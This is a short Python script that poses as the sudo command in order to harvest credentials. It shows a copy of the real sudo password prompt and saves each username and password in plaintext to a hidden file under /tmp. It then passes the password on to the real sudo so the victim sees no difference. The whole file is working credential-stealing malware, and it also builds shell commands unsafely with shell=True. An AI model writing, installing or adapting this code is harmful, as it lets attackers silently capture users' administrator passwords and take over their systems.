#!/usr/bin/env python
#-*- coding:utf8 -*-

import os
import sys
import getpass
import subprocess as sp

command = ' '.join(map(str, sys.argv[1:]))
username = getpass.getuser()
prompt = "[sudo] password for {0}: ".format(username)
dumpdir = "/tmp/.snooper" 
dumpfile = "/tmp/.snooper/dump.txt" 
sudo = 'sudo' # 

def run(command):
    sp.call(command, shell=True)

def snoop():
    password = getpass.getpass(prompt)
    if os.path.isfile(dumpfile):
        dump = open(dumpfile, 'a')
        dump.write("\n{0} : {1}".format(username, password))
        dump.close()
    else:
        run("mkdir -p {0}".format(dumpdir))
        dump = open(dumpfile, 'w')
        dump.write("\n{0} : {1}".format(username, password))
        dump.close()
    return password

def sudocmd(cmd, password):
    wrapper = "echo {0} 2>/dev/null | {1} -kS {2}".format(password, sudo, cmd)
    run(wrapper)


def main():
    sudocmd(command, snoop())

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()
